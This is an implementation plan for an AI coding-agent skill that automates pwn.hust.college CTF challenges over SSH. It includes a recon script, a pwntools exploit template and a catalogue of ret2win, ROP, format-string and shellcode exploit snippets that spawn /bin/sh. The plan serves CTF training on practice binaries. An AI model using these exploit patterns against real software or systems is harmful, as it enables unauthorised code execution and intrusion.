# pwnhustcollege Skill Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a Claude Code skill that automates SSH connection, binary analysis, and exploit generation for pwn.hust.college CTF challenges.

**Architecture:** The skill is a technique-type skill with supporting shell/Python scripts. `skill.md` defines the 4-phase workflow (connect→analyze→exploit→flag). `scripts/recon.sh` runs automated reconnaissance on the remote host. `scripts/exploit_template.py` provides a pwntools base for exploit generation. `references/pwn-patterns.md` catalogs vulnerability patterns.

**Tech Stack:** Bash (SSH/recon scripts), Python/pwntools (exploit templates), Markdown (skill definition)

---

## File Structure

```
pwnhustcollege_skill/
├── skill.md                       # Main skill definition + 4-phase workflow
├── scripts/
│   ├── recon.sh                   # Remote reconnaissance script
│   └── exploit_template.py        # pwntools exploit base template
└── references/
    └── pwn-patterns.md            # Vulnerability pattern catalog (heavy reference, 100+ lines)
```

**Design rationale:**
- `skill.md` is self-contained with the workflow inline (technique skill, not reference-heavy)
- `scripts/recon.sh` is a reusable tool executed over SSH
- `scripts/exploit_template.py` is a reusable code template
- `references/pwn-patterns.md` is heavy reference (100+ lines of vulnerability patterns) — kept separate for token efficiency

---

### Task 1: Create directory structure and skill.md

**Files:**
- Create: `skill.md`
- Create: `scripts/` directory
- Create: `references/` directory

- [ ] **Step 1: Create directories**

```bash
mkdir -p /Users/mudongliang/Repos/pwnhustcollege_skill/scripts
mkdir -p /Users/mudongliang/Repos/pwnhustcollege_skill/references
```

- [ ] **Step 2: Write skill.md with frontmatter and 4-phase workflow**

Write `skill.md`:

```markdown
---
name: pwnhustcollege
description: Use when solving pwn/binary exploitation challenges on pwn.hust.college — the user mentions challenge numbers, wants to SSH into the platform, needs binary analysis or exploit generation for CTF challenges
---

# pwnhustcollege Skill

## Overview

Automates solving binary exploitation challenges on pwn.hust.college. Connects via SSH, analyzes challenge binaries, identifies vulnerabilities, and generates pwntools exploits — pausing only at key decision points for user confirmation.

## Platform Context

- SSH: `ssh -i ~/.ssh/key hacker@pwn.cse.hust.edu.cn`
- Challenge binary: `/challenge/solve`
- Description: `/challenge/DESCRIPTION`
- Flag: `/flag`
- Home: `/home/hacker` (persistent across sessions)
- Pre-installed: pwntools, pwndbg, gdb, gef, radare2, ghidra, strace, checksec

## When to Use

- User mentions pwn.hust.college challenges
- User wants to solve a specific challenge number
- User needs binary exploitation help on the platform
- User wants to SSH into the platform and analyze a binary

## Workflow

### Phase 1: Connection & Reconnaissance

1. SSH into the platform: `ssh -i ~/.ssh/key hacker@pwn.cse.hust.edu.cn`
2. Read the challenge description: `cat /challenge/DESCRIPTION`
3. Run automated reconnaissance by executing `scripts/recon.sh` on the remote host via SSH
4. Present a structured analysis report to the user:
   - Binary type (from `file`)
   - Security protections (from `checksec`: canary, NX, PIE, RELRO)
   - Key functions (from `objdump -d` disassembly of main and notable functions)
   - Interesting strings (from `strings` output)

### Phase 2: Vulnerability Analysis

Based on reconnaissance data, identify the vulnerability type by matching patterns from `references/pwn-patterns.md`:

Common patterns to check:
- **ret2win**: A win function exists (e.g., `win`, `flag`, `shell`, `cat_flag`) + stack overflow
- **ROP**: No win function, NX enabled, need to chain gadgets
- **Format string**: `printf(user_input)` pattern (no format string argument)
- **Shellcode**: NX disabled + writable + executable memory region
- **Bypass canary**: Canary present + leak primitive available

Present the finding with:
- Vulnerability type and confidence
- Supporting evidence (disassembly snippet, offset calculation)
- Proposed exploit strategy

**This is the key decision gate.** Ask the user to confirm the strategy before proceeding.

### Phase 3: Exploit Generation

Generate a pwntools exploit script based on the confirmed vulnerability type:

- Start from `scripts/exploit_template.py` base
- Adapt for the specific vulnerability:
  - **ret2win**: Calculate padding offset → pack win function address
  - **ROP**: Find gadgets with `ROPgadget` or `ropper` → build ROP chain
  - **Format string**: Determine offset on stack → craft `%n` write payload
  - **Shellcode**: Generate shellcode with pwntools `shellcraft` → inject
- Write the exploit script to `/home/hacker/exploit.py` on the remote host
- Execute with `python3 /home/hacker/exploit.py`
- Capture the flag from output

### Phase 4: Flag Output

- Display the captured flag clearly
- Remind user to submit via the platform web UI: paste into the light-green input box on the challenge page
- Optionally save a local note with the challenge number and flag

## Using the Recon Script

The `scripts/recon.sh` script runs automated reconnaissance commands on the remote host:

```bash
# Copy and run on the remote host
scp -i ~/.ssh/key scripts/recon.sh hacker@pwn.cse.hust.edu.cn:/home/hacker/
ssh -i ~/.ssh/key hacker@pwn.cse.hust.edu.cn 'bash /home/hacker/recon.sh'
```

The script executes: `file`, `checksec`, `objdump -d` (main + notable functions), `strings` (filtered), and `readelf` (sections/symbols if available).

## Common Mistakes

- **Not reading DESCRIPTION first**: Always read `/challenge/DESCRIPTION` before analyzing — it often contains critical hints
- **Wrong SSH key path**: Default is `~/.ssh/key`, but check user's actual key location
- **Assuming local tools**: All analysis runs on the remote host where tools are pre-installed — don't try to run checksec/pwntools locally
- **Skipping the decision gate**: Always confirm exploit strategy with user before generating code
- **Forgetting to submit**: Flag is captured but must be manually submitted via the web UI
```

- [ ] **Step 3: Commit**

```bash
git add skill.md scripts/ references/
git commit -m "feat: add skill.md with 4-phase pwn workflow"
```

---

### Task 2: Write references/pwn-patterns.md — vulnerability pattern catalog

**Files:**
- Create: `references/pwn-patterns.md`

- [ ] **Step 1: Write the vulnerability pattern reference**

Write `references/pwn-patterns.md`:

```markdown
# PWN Vulnerability Patterns Reference

Quick-reference catalog for identifying common binary exploitation vulnerabilities from reconnaissance output.

## ret2win

**Indicators:**
- `checksec` shows NX enabled, no canary (or canary irrelevant if we control return directly)
- `strings` or symbol table shows function names like: `win`, `flag`, `shell`, `cat_flag`, `get_flag`, `print_flag`
- Disassembly of the win function calls `system("/bin/cat /flag")` or `execve("/bin/sh")`
- `objdump -d` shows a `main` or `vuln` function with an obvious buffer overflow (e.g., `gets`, `read(0, buf, large_size)`)

**Exploit strategy:**
1. Find offset to return address (pattern create + pattern offset, or calculate from buffer size + saved rbp)
2. Pack address of win function (little-endian, 64-bit addresses)
3. If PIE enabled, need a leak first; if no PIE, address is fixed

**Example:**
```python
from pwn import *
p = process('/challenge/solve')
offset = 40  # determined by pattern offset
win_addr = 0x401236  # from objdump
payload = b'A' * offset + p64(win_addr)
p.sendline(payload)
p.interactive()
```

## ROP (Return-Oriented Programming)

**Indicators:**
- NX enabled (no shellcode)
- No obvious win function in symbols/strings
- Stack overflow primitive exists
- Need to call `system("/bin/sh")` or `execve`

**Exploit strategy:**
1. Find `pop rdi; ret` gadget: `ROPgadget --binary /challenge/solve | grep "pop rdi"`
2. Find address of `system@plt` (from objdump) or `/bin/sh` string in binary
3. Build chain: `padding + pop_rdi + binsh_addr + system_addr`
4. If no `/bin/sh` string in binary, write it to a known writable address (bss) via `gets` or `read`

**Example:**
```python
from pwn import *
elf = ELF('/challenge/solve')
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
binsh = next(elf.search(b'/bin/sh'))
payload = b'A' * offset + p64(pop_rdi) + p64(binsh) + p64(elf.plt['system'])
```

## Format String

**Indicators:**
- Disassembly shows `printf(user_buffer)` without a format string argument
- Or `fprintf`, `sprintf`, `dprintf` with user-controlled format
- No canary is common (but not required)

**Exploit strategy:**
1. Determine offset: send `AAAA%p.%p.%p...` and find where `0x41414141` appears
2. Choose target: overwrite GOT entry (e.g., `printf@got` → `system`) or return address
3. Write byte-by-byte with `%n`, `%hn`, or `%hhn`

**Use pwntools fmtstr module:**
```python
from pwn import *
elf = ELF('/challenge/solve')
p = process('/challenge/solve')
writes = {elf.got['puts']: elf.symbols['win']}
payload = fmtstr_payload(offset, writes)
p.sendline(payload)
```

## Shellcode

**Indicators:**
- `checksec` shows NX disabled
- Writable + executable memory region exists
- Stack is executable (`readelf -l` shows `E` flag on stack)

**Exploit strategy:**
1. Find address of buffer (leak or fixed)
2. Generate shellcode: `shellcraft.sh()` for x86_64 Linux
3. Jump to shellcode (overwrite return address or use `jmp rsp`/`call rax` gadget)

**Example:**
```python
from pwn import *
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())
p = process('/challenge/solve')
buf_addr = 0x7fffffffde00  # from leak or fixed
payload = shellcode + b'A' * (offset - len(shellcode)) + p64(buf_addr)
p.sendline(payload)
p.interactive()
```

## Stack Canary Bypass

**Indicators:**
- `checksec` shows canary enabled
- Program leaks data (format string, buffer over-read)

**Exploit strategy:**
1. Leak canary value (format string or over-read)
2. Use canary in payload: `padding + canary + saved_rbp + target_addr`
3. Rest of exploit same as ret2win or ROP

## PIE Bypass

**Indicators:**
- `checksec` shows PIE enabled
- Need to leak code address first

**Exploit strategy:**
1. Leak a return address or GOT entry (format string or over-read)
2. Calculate base address: `leaked_addr - known_offset`
3. Recalculate all addresses: `base + function_offset`

## Tools Quick Reference

| Tool | Command | Purpose |
|------|---------|---------|
| file | `file /challenge/solve` | Binary type, arch, bits |
| checksec | `checksec /challenge/solve` | Protections: canary, NX, PIE, RELRO, FORTIFY |
| objdump | `objdump -d /challenge/solve` | Disassembly |
| strings | `strings /challenge/solve` | Embedded strings |
| readelf | `readelf -l /challenge/solve` | Program headers (exec stack?) |
| readelf | `readelf -s /challenge/solve` | Symbol table |
| ROPgadget | `ROPgadget --binary /challenge/solve` | Find ROP gadgets |
| ropper | `ropper -f /challenge/solve` | Alternative gadget finder |
| radare2 | `r2 -q -c 'aaa; pdf @main' /challenge/solve` | Full binary analysis |
| pwntools | `python3 -c "from pwn import *; ..."` | Exploit development |
```

- [ ] **Step 2: Commit**

```bash
git add references/pwn-patterns.md
git commit -m "feat: add vulnerability pattern reference for pwn challenges"
```

---

### Task 3: Write scripts/recon.sh — automated reconnaissance

**Files:**
- Create: `scripts/recon.sh`

- [ ] **Step 1: Write the reconnaissance script**

Write `scripts/recon.sh`:

```bash
#!/bin/bash
# pwnhustcollege reconnaissance script
# Run on the remote host to gather challenge binary information
# Usage: bash recon.sh [/path/to/binary]  (default: /challenge/solve)

BINARY="${1:-/challenge/solve}"
DESC="${2:-/challenge/DESCRIPTION}"

echo "=============================================="
echo "  pwnhustcollege Reconnaissance Report"
echo "  Target: $BINARY"
echo "=============================================="

# Challenge description
if [ -f "$DESC" ]; then
  echo ""
  echo "--- CHALLENGE DESCRIPTION ---"
  cat "$DESC"
fi

echo ""
echo "--- FILE INFO ---"
file "$BINARY" 2>/dev/null || echo "(binary not found)"

echo ""
echo "--- SECURITY PROTECTIONS ---"
checksec --file="$BINARY" 2>/dev/null || checksec "$BINARY" 2>/dev/null || echo "(checksec unavailable)"

echo ""
echo "--- PROGRAM HEADERS ---"
readelf -l "$BINARY" 2>/dev/null | grep -E "STACK|GNU_STACK|RELRO" || echo "(readelf unavailable)"

echo ""
echo "--- SYMBOLS ---"
readelf -s "$BINARY" 2>/dev/null | grep -E 'FUNC|OBJECT' | grep -v 'GLIBC\|__' | head -30 || echo "(readelf unavailable)"
nm "$BINARY" 2>/dev/null | grep -E ' [TtWw] ' | grep -v '@@\|GLIBC\|__' | head -30 || true

echo ""
echo "--- DISASSEMBLY: main ---"
objdump -d "$BINARY" 2>/dev/null | sed -n '/<main>:/,/^$/p' | head -60 || echo "(objdump unavailable)"

echo ""
echo "--- DISASSEMBLY: notable functions ---"
for func in win flag shell cat_flag get_flag vuln exploit hack target solve; do
  objdump -d "$BINARY" 2>/dev/null | sed -n "/<$func>:/,/^$/p" | head -20
done

echo ""
echo "--- INTERESTING STRINGS ---"
strings "$BINARY" 2>/dev/null | grep -iE 'flag|/bin/sh|/bin/bash|cat |system|exec|secret|password|admin|root|win|success|congratulation' || echo "(no interesting strings found)"

echo ""
echo "--- PLT ENTRIES ---"
objdump -d "$BINARY" 2>/dev/null | grep '@plt>' | head -20 || echo "(no PLT entries visible)"

echo ""
echo "=============================================="
echo "  Reconnaissance complete"
echo "=============================================="
```

- [ ] **Step 2: Make executable and commit**

```bash
chmod +x /Users/mudongliang/Repos/pwnhustcollege_skill/scripts/recon.sh
git add scripts/recon.sh
git commit -m "feat: add automated reconnaissance script for remote binary analysis"
```

---

### Task 4: Write scripts/exploit_template.py — pwntools exploit base

**Files:**
- Create: `scripts/exploit_template.py`

- [ ] **Step 1: Write the exploit template**

Write `scripts/exploit_template.py`:

```python
#!/usr/bin/env python3
"""
pwntools exploit template for pwn.hust.college challenges.
Adapt this template based on vulnerability analysis.

Usage:
  python3 exploit_template.py [REMOTE|LOCAL]
    LOCAL  - test against local binary (default)
    REMOTE - run against /challenge/solve on the remote host
"""

from pwn import *

BINARY = '/challenge/solve'
HOST = 'localhost'
PORT = 0  # 0 means use process() instead of remote()

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF(BINARY)


def get_target():
    if PORT:
        return remote(HOST, PORT)
    return process(BINARY)


def main():
    p = get_target()

    # ==================== EXPLOIT CODE ====================
    # Fill in based on vulnerability analysis
    #
    # RET2WIN:
    #   offset = 40  # find with cyclic(100) + cyclic_find
    #   payload = b'A' * offset + p64(elf.symbols['win'])
    #   p.sendline(payload)
    #
    # ROP:
    #   rop = ROP(elf)
    #   pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    #   binsh = next(elf.search(b'/bin/sh'))
    #   payload = b'A' * offset + p64(pop_rdi) + p64(binsh) + p64(elf.plt['system'])
    #   p.sendline(payload)
    #
    # FORMAT STRING:
    #   payload = fmtstr_payload(offset, {elf.got['puts']: elf.symbols['win']})
    #   p.sendline(payload)
    #
    # SHELLCODE:
    #   shellcode = asm(shellcraft.sh())
    #   payload = shellcode.ljust(offset, b'A') + p64(buf_addr)
    #   p.sendline(payload)
    # =======================================================

    p.interactive()


if __name__ == '__main__':
    main()
```

- [ ] **Step 2: Commit**

```bash
git add scripts/exploit_template.py
git commit -m "feat: add pwntools exploit template for pwn challenges"
```

---

### Task 5: Final integration — verify structure and commit

**Files:**
- Verify: `skill.md`, `references/pwn-patterns.md`, `scripts/recon.sh`, `scripts/exploit_template.py`

- [ ] **Step 1: Verify file structure**

```bash
ls -la skill.md scripts/recon.sh scripts/exploit_template.py references/pwn-patterns.md
```

Expected: All four files exist.

- [ ] **Step 2: Verify recon.sh is executable**

```bash
test -x scripts/recon.sh && echo "PASS: executable" || echo "FAIL: not executable"
```

Expected: PASS

- [ ] **Step 3: Verify skill.md frontmatter**

Check that `name:` uses only letters/hyphens, `description:` starts with "Use when...", and frontmatter is under 1024 chars.

- [ ] **Step 4: Self-review against spec**

Check each design requirement:
- [x] 4-phase workflow documented in skill.md
- [x] Reconnaissance commands defined (recon.sh)
- [x] Vulnerability patterns catalogued (pwn-patterns.md)
- [x] Exploit template covers ret2win, ROP, format string, shellcode
- [x] SSH connection instructions included
- [x] One decision gate (Phase 2 → Phase 3)

- [ ] **Step 5: Final commit**

```bash
git add -A
git commit -m "feat: complete pwnhustcollege skill implementation"
```
